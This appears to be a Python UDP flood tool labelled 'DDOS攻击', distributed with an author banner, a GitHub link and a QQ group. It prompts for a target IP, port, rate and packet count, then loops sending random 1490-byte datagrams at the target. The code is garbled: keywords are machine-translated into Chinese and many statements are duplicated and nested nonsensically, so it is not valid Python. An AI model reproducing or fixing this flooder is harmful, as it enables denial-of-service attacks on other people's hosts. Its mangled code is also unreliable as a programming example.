进口sys
进口操作系统
进口时间
进口插座
进口随机
#代码时间
从……起datetime进口datetime
.现在()日期时间。现在()现在()日期时间。现在()
小时=现在。小时
分钟=现在。分钟
天=现在。一天
月=现在。月
年=现在。年

##############
袜子=插座。插座(插座。AF_INET，插座。sock_Dgram)插座。插座(插座。AF_INET，插座。sock_Dgram)插座。插座(插座。插座(插座。AF_INET，插座。sock_Dgram)插座。插座(插座。AF_INET，插座。sock_Dgram))插座。插座(插座。AF_INET，插座。sock_Dgram)
字节=随机。 随机。 随机。随机。随机。_随机(1490)随机。 随机。随机。_随机(1490)随机。随机。_随机(1490)随机。随机。_随机(1490)随机。_无规则的(1490)随机。_随机(1490)随机。_无规则的(1490)
#############

操作系统。系统("清除")
操作系统。系统("figlet DDOS攻击")
打印打印 (" ")(" ")
打印打印("/---------------------------------------------------\")("/---------------------------------------------------\")
打印("|   作者          : 放空                       |")("|   作者          : 放空                       |")("|   作者          : 放空                       |")("|   作者          : 放空                       |")
打印("|作者GitHub:https://github.com/FKNB666|")("|作者GitHub:https://github.com/FKNB666|")
打印("|kali-QQ学习群：1041839393|")("|kali-QQ学习群：1041839393|")
打印("|版本：v1.1.0|")("|版本：v1.1.0|")
打印("|   严禁转载，程序教程仅发布在放空交流群（用户放空）   |")("|   严禁转载，程序教程仅发布在放空交流群（用户放空）   |")("|   严禁转载， 程序教程仅发布在放空交流群（用户放空）   |")("|   严禁转载，程序教程仅发布在放空交流群（用户放空）   |")("|   严禁转载， 程序教程仅发布在放空交流群（用户放空）   |")("|   严禁转载，程序教程仅发布在放空交流群（用户放空）   |") ("|   严禁转载， 程序教程仅发布在放空交流群（用户放空）   |")("|   严禁转载，程序教程仅发布在放空交流群（用户放空）   |")("|   严禁转载， 程序教程仅发布在放空交流群（用户放空）   |")("|   严禁转载，程序教程仅发布在放空交流群（用户放空）   |")("|   严禁转载， 程序教程仅发布在放空交流群（用户放空）   |")("|   严禁转载，程序教程仅发布在放空交流群（用户放空）   |")("|   严禁转载， 程序教程仅发布在放空交流群（用户放空）   |")("|   严禁转载，程序教程仅发布在放空交流群（用户放空）   |")("|   严禁转载， 程序教程仅发布在放空交流群（用户放空）   |")("|   严禁转载，程序教程仅发布在放空交流群（用户放空）   |")("|   严禁转载， 程序教程仅发布在放空交流群（用户放空）   |")("|   严禁转载，程序教程仅发布在放空交流群（用户放空）   |")("|   严禁转载， 程序教程仅发布在放空交流群（用户放空）   |")("|   严禁转载，程序教程仅发布在放空交流群（用户放空）   |") ("|   严禁转载， 程序教程仅发布在放空交流群（用户放空）   |")("|   严禁转载，程序教程仅发布在放空交流群（用户放空）   |")("|   严禁转载， 程序教程仅发布在放空交流群（用户放空）   |")("|   严禁转载，程序教程仅发布在放空交流群（用户放空）   |")("|   严禁转载， 程序教程仅发布在放空交流群（用户放空）   |")("|   严禁转载，程序教程仅发布在放空交流群（用户放空）   |")
打印("\---------------------------------------------------/")("\---------------------------------------------------/")
打印(" ")(" ")(" ")(" ")(" ")(" ")(" ")(" ")(" ")(" ")(" ")(" ")(" ")(" ")(" ") (" ")(" ")(" ")(" ")(" ")(" ")(" ")(" ")(" ")(" ")(" ")(" ")(" ")(" ")(" ") (" ")(" ")
打印("-----------------[请勿用于违法用途]-----------------")("-----------------[请勿用于违法用途]-----------------")
打印(" ")(" ")(" ")(" ")(" ")(" ")(" ")(" ")(" ")(" ")(" ")(" ")(" ")(" ")(" ")(" ")(" ")(" ")(" ")(" ")(" ")(" ")(" ")(" ")(" ")(" ")(" ")(" ")(" ")(" ")(" ")(" ")
互联网协议=输入("请输入IP：")输入("请输入IP：")输入("请输入IP：")输入("请输入IP：")输入("请输入IP：")输入("请输入IP：")输入("请输入IP：")输入("请输入IP：")输入("请输入IP：")输入("请输入IP：")输入("请输入IP：")输入("请输入IP：")输入("请输入IP：")输入("请输入IP：")
端口=int(输入("攻击端口："))int(输入("攻击端口："))int(输入("攻击端口："))int(输入("攻击端口：")int(输入("攻击端口："))int(输入("攻击端口："))int(输入("攻击端口："))int(输入("攻击端口："))int(输入("攻击端口："))
SD=int(输入("攻击速度(1~1000)："))int(输入("攻击速度(1~1000)："))int(输入("攻击速度(1~1000)："))int(输入("攻击速度(1~1000)："))
CS=int(输入("攻击次数："))int(输入("攻击次数："))
操作系统。系统("清除")
FK=00
发送=00
在...期间FK<CS：
袜子。sendto(字节，(袜子。sendto(字节，(互联网协议，端口))))
发送=发送+11
FK=fk+11
打印("已发送%s个数据包到%s端口%d"打印("已发送%s个数据包到%s端口%d"%(发送，互联网协议，端口))打印("已发送%s个数据包到%s端口%d"%(发送，互联网协议，端口))(发送，互联网协议，端口))打印("已发送%s个数据包到%s端口%d"%(发送，互联网协议，端口))
时间。睡((1000(1000-SD)/2000)
